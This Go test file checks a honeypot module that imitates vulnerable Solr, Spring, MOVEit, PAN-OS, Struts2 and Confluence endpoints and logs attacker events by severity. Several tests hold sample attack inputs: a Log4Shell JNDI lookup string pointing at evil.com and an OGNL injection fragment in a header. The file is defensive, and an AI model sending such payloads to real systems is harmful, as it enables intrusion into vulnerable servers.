package cve

import (
	"context"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/0xsj/firewatch/internal/config"
	"github.com/0xsj/firewatch/internal/storage"
	"github.com/0xsj/firewatch/internal/storage/models"
)

// mockStore implements storage.Store with just enough to capture events.
type mockStore struct {
	events []*models.Event
}

func (m *mockStore) SaveEvent(_ context.Context, e *models.Event) error {
	m.events = append(m.events, e)
	return nil
}

func (m *mockStore) GetEvent(context.Context, string) (*models.Event, error) { return nil, nil }
func (m *mockStore) ListEvents(context.Context, storage.EventFilter) ([]*models.Event, error) {
	return nil, nil
}
func (m *mockStore) CountEvents(context.Context, storage.EventFilter) (int64, error) { return 0, nil }
func (m *mockStore) SaveAttacker(context.Context, *models.Attacker) error            { return nil }
func (m *mockStore) GetAttacker(context.Context, string) (*models.Attacker, error) {
	return nil, nil
}
func (m *mockStore) GetAttackerByIP(context.Context, string) (*models.Attacker, error) {
	return nil, nil
}
func (m *mockStore) ListAttackers(context.Context, storage.AttackerFilter) ([]*models.Attacker, error) {
	return nil, nil
}
func (m *mockStore) SaveCampaign(context.Context, *models.Campaign) error { return nil }
func (m *mockStore) GetCampaign(context.Context, string) (*models.Campaign, error) {
	return nil, nil
}
func (m *mockStore) ListCampaigns(context.Context, storage.CampaignFilter) ([]*models.Campaign, error) {
	return nil, nil
}
func (m *mockStore) SaveIOC(context.Context, *models.IOC) error { return nil }
func (m *mockStore) ListIOCs(context.Context, storage.IOCFilter) ([]*models.IOC, error) {
	return nil, nil
}
func (m *mockStore) UpdateEventLinks(context.Context, string, string, string) error { return nil }
func (m *mockStore) Close() error                                                   { return nil }

func newTestModule() (*CVE, *mockStore) {
	store := &mockStore{}
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	mod := New(config.CVEModuleConfig{Enabled: true}, store, logger)
	return mod, store
}

func TestCVE_Name(t *testing.T) {
	mod, _ := newTestModule()
	if mod.Name() != "cve" {
		t.Errorf("Name() = %q, want %q", mod.Name(), "cve")
	}
}

func TestCVE_Routes(t *testing.T) {
	mod, _ := newTestModule()
	routes := mod.Routes()
	if len(routes) != 14 {
		t.Fatalf("Routes() returned %d routes, want 14", len(routes))
	}
}

func TestCVE_RoutesFiltered(t *testing.T) {
	store := &mockStore{}
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	mod := New(config.CVEModuleConfig{
		Enabled: true,
		CVEs:    []string{"CVE-2021-44228", "CVE-2024-3400"},
	}, store, logger)

	routes := mod.Routes()
	// Log4Shell: 2 routes + PAN-OS: 2 routes = 4
	if len(routes) != 4 {
		t.Fatalf("Routes() with filter returned %d routes, want 4", len(routes))
	}

	patterns := make(map[string]bool)
	for _, r := range routes {
		patterns[r.Pattern] = true
	}
	if !patterns["GET /solr/admin/cores"] {
		t.Error("missing Log4Shell route")
	}
	if !patterns["POST /ssl-vpn/hipreport.esp"] {
		t.Error("missing PAN-OS route")
	}
	if patterns["GET /actuator/health"] {
		t.Error("Spring4Shell route should be filtered out")
	}
}

func TestCVE_SolrGet(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/solr/admin/cores", nil)

	mod.handleSolrGet(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	if ct := rec.Header().Get("Content-Type"); !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	if !strings.Contains(rec.Body.String(), "core0") {
		t.Error("response body missing core0")
	}
	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	if store.events[0].Severity != "medium" {
		t.Errorf("severity = %q, want medium", store.events[0].Severity)
	}
}

func TestCVE_SolrPostJNDI(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/solr/admin/cores",
		strings.NewReader(`action=CREATE&name=${jndi:ldap://evil.com/a}`))

	mod.handleSolrPost(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	e := store.events[0]
	if e.Severity != "critical" {
		t.Errorf("severity = %q, want critical", e.Severity)
	}
	if len(e.Signatures) < 2 {
		t.Errorf("signatures = %v, want at least 2", e.Signatures)
	}
}

func TestCVE_SolrPostNoJNDI(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/solr/admin/cores",
		strings.NewReader(`action=STATUS`))

	mod.handleSolrPost(rec, req)

	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	if store.events[0].Severity != "high" {
		t.Errorf("severity = %q, want high", store.events[0].Severity)
	}
}

func TestCVE_ActuatorHealth(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/actuator/health", nil)

	mod.handleActuatorHealth(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	if !strings.Contains(rec.Body.String(), "UP") {
		t.Error("response body missing UP")
	}
	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	if store.events[0].Severity != "medium" {
		t.Errorf("severity = %q, want medium", store.events[0].Severity)
	}
}

func TestCVE_ActuatorEnv(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/actuator/env", nil)

	mod.handleActuatorEnv(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	if !strings.Contains(rec.Body.String(), "spring.datasource") {
		t.Error("response body missing spring.datasource")
	}
	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	e := store.events[0]
	if e.Severity != "high" {
		t.Errorf("severity = %q, want high", e.Severity)
	}
	if len(e.Signatures) < 2 {
		t.Errorf("signatures = %v, want at least 2", e.Signatures)
	}
}

func TestCVE_MOVEitGet(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/human.aspx", nil)

	mod.handleMOVEitGet(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	if !strings.Contains(rec.Body.String(), "MOVEit") {
		t.Error("response body missing MOVEit")
	}
	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	if store.events[0].Severity != "medium" {
		t.Errorf("severity = %q, want medium", store.events[0].Severity)
	}
}

func TestCVE_MOVEitPost(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/guestaccess.aspx",
		strings.NewReader("transaction=foo"))

	mod.handleMOVEitPost(rec, req)

	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	e := store.events[0]
	if e.Severity != "high" {
		t.Errorf("severity = %q, want high", e.Severity)
	}
	if len(e.Signatures) < 2 {
		t.Errorf("signatures = %v, want at least 2", e.Signatures)
	}
}

func TestCVE_PANOSGet(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/global-protect/portal/css/login.css", nil)

	mod.handlePANOSGet(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	if ct := rec.Header().Get("Content-Type"); !strings.Contains(ct, "text/css") {
		t.Errorf("Content-Type = %q, want text/css", ct)
	}
	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	if store.events[0].Severity != "medium" {
		t.Errorf("severity = %q, want medium", store.events[0].Severity)
	}
}

func TestCVE_PANOSPost(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/ssl-vpn/hipreport.esp",
		strings.NewReader("payload"))

	mod.handlePANOSPost(rec, req)

	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	e := store.events[0]
	if e.Severity != "critical" {
		t.Errorf("severity = %q, want critical", e.Severity)
	}
	if len(e.Signatures) < 2 {
		t.Errorf("signatures = %v, want at least 2", e.Signatures)
	}
}

func TestCVE_StrutsGet(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/struts2-showcase/", nil)

	mod.handleStrutsGet(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	if !strings.Contains(rec.Body.String(), "Struts2") {
		t.Error("response body missing Struts2")
	}
	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	if store.events[0].Severity != "medium" {
		t.Errorf("severity = %q, want medium", store.events[0].Severity)
	}
}

func TestCVE_StrutsPostOGNL(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/struts2-showcase/",
		strings.NewReader("test"))
	req.Header.Set("Content-Type", `%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}`)

	mod.handleStrutsPost(rec, req)

	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	e := store.events[0]
	if e.Severity != "critical" {
		t.Errorf("severity = %q, want critical", e.Severity)
	}
	if len(e.Signatures) < 2 {
		t.Errorf("signatures = %v, want at least 2", e.Signatures)
	}
}

func TestCVE_StrutsPostNormal(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/struts2-showcase/",
		strings.NewReader("name=test"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	mod.handleStrutsPost(rec, req)

	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	if store.events[0].Severity != "high" {
		t.Errorf("severity = %q, want high", store.events[0].Severity)
	}
}

func TestCVE_ConfluenceGet(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/wiki/", nil)

	mod.handleConfluenceGet(rec, req)

	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	if !strings.Contains(rec.Body.String(), "Confluence") {
		t.Error("response body missing Confluence")
	}
	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	if store.events[0].Severity != "medium" {
		t.Errorf("severity = %q, want medium", store.events[0].Severity)
	}
}

func TestCVE_ConfluenceInfo(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/server-info.action", nil)

	mod.handleConfluenceInfo(rec, req)

	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	if store.events[0].Severity != "high" {
		t.Errorf("severity = %q, want high", store.events[0].Severity)
	}
}

func TestCVE_ConfluencePost(t *testing.T) {
	mod, store := newTestModule()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/setup/setupadministrator.action",
		strings.NewReader("username=attacker&password=evil"))

	mod.handleConfluencePost(rec, req)

	if len(store.events) != 1 {
		t.Fatalf("events = %d, want 1", len(store.events))
	}
	e := store.events[0]
	if e.Severity != "critical" {
		t.Errorf("severity = %q, want critical", e.Severity)
	}
	if len(e.Signatures) < 2 {
		t.Errorf("signatures = %v, want at least 2", e.Signatures)
	}
}
